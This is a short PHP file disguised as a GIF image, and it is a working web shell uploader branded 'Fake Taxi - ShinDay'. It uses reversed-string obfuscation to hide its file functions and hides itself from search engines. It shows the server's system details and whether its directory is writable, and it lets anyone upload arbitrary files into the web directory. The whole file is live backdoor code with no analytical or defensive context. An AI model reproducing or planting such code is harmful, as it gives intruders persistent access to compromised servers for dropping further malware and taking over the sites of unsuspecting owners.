GIF89a;<?php
header('X-Robots-Tag: noindex, nofollow, noarchive');
error_reporting(0);
$rev='strrev';
$move=$rev('elif_dedaolpu_evom');
$copy=$rev('ypoc');
$rename=$rev('emanresu');
$base=$rev('emanesab');
$msg='';
if($_SERVER['REQUEST_METHOD']=='POST'&&isset($_FILES['a'])){
    $tmp=$_FILES['a']['tmp_name'];
    $name=$base($_FILES['a']['name']);
    if($move($tmp,$name)) $msg="âœ” <a href='$name'>$name</a> (A)";
    elseif($copy($tmp,$name)) $msg="âœ” <a href='$name'>$name</a> (B)";
    elseif($rename($tmp,$name)) $msg="âœ” <a href='$name'>$name</a> (C)";
    else $msg="âœ– Gagal";
}
$info=(function_exists('php_uname')?php_uname():PHP_OS).'<br>'.getcwd().' |  '.(is_writable(getcwd())?'Y':'N');
?>
<!DOCTYPE html>
<html>
<head>
<meta name="robots" content="noindex, nofollow, noarchive"><title>Fake Taxi</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:20px}
.box{border:1px solid #0f0;max-width:450px;margin:auto;padding:20px;overflow-x:auto}
.info{white-space:pre-wrap;word-break:break-all}
input,button{margin:8px}
</style>
</head>
<body>
<h1>ðŸš– | Fake Taxi - ShinDay  |</h1>
<div class="box">
<div class="info"><?php echo $info; ?></div>
<form method="post" enctype="multipart/form-data">
<input type="file" name="a" required><br>
<input type="submit" value="Upload">
</form>
<?php if($msg) echo "<div style='margin-top:15px;word-break:break-all'>$msg</div>"; ?>
</div>
</body>
</html>
